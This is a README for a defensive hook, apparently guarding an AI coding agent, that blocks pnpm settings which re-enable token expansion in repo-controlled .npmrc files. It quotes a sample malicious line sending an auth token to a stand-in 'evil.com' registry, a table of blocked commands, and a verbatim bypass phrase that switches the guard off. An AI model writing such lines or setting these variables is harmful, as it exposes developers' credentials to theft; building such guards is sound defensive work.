# npmrc-trust-optout-guard

PreToolUse Bash + Edit/Write hook that blocks the supply-chain escape hatch
pnpm 10.34.2 / 11.5.3 left when it made `${ENV_VAR}` expansion in
repo-controlled credential settings trust-aware (refuse-by-default).

## Why

Old pnpm expanded `${ENV}` placeholders everywhere, including a committed
`.npmrc`. A malicious repo could ship
`//registry.evil.com/:_authToken=${NPM_TOKEN}`, and `pnpm install` would expand
the placeholder and send the developer's token to the attacker's registry. The
fix refuses to expand `_authToken` / `registry` / `@scope:registry` in
repo-controlled files.

Two env vars **disable** that protection for a checkout:

- `PNPM_CONFIG_NPMRC_AUTH_FILE` (pnpm v11)
- `NPM_CONFIG_USERCONFIG` pointed at a repo-local `.npmrc` (v10 fallback)

Setting either re-opens the exfiltration hole. `trust-downgrade-guard` covers
the `trustPolicy` / `minimumReleaseAge` / `blockExoticSubdeps` gates; this hook
covers the env-expansion opt-out, which those did not.

## What it blocks

**Bash** (AST-parsed via `_shared/shell-command.mts`):

| Shape | Block? |
| --- | --- |
| `PNPM_CONFIG_NPMRC_AUTH_FILE=x pnpm i` | yes |
| `export NPM_CONFIG_USERCONFIG=.npmrc` | yes |
| bare `NPM_CONFIG_USERCONFIG=./.npmrc` | yes |
| `NPM_CONFIG_USERCONFIG=~/.npmrc` (HOME, not repo) | no |
| `NPM_CONFIG_USERCONFIG=/dev/null` | no |

**Edit/Write** to a committed config / script / workflow
(`.npmrc`, `*.sh`, `*.mts`/`*.ts`, `*.yml`/`*.yaml`, `Dockerfile`,
`.github/**`, dotenv):

- lands `PNPM_CONFIG_NPMRC_AUTH_FILE` or a repo-local `NPM_CONFIG_USERCONFIG`
- introduces a `${ENV}` / `$ENV` placeholder beside `_authToken=` /
  `registry=` / `:registry=` in a committed `.npmrc`

## What it does NOT block

- `NPM_CONFIG_USERCONFIG` pointed at a HOME / absolute non-repo `.npmrc`, or
  `/dev/null` — those don't trust a repo file.
- An edit to a non-committed scratch file.
- A documentation mention of the var name with no assignment.

## Bypass

`Allow npmrc-trust-optout bypass` (verbatim, recent user turn). The only
legitimate case is a CI image that builds exclusively trusted first-party repos.
Use sparingly — the protection should stay on everywhere else.

## Detection

All logic lives in `_shared/npmrc-trust.mts`, shared with the commit-time
`scripts/fleet/check/trust-gates-are-not-weakened.mts` check so the two surfaces
never drift. Fails open on any hook error.
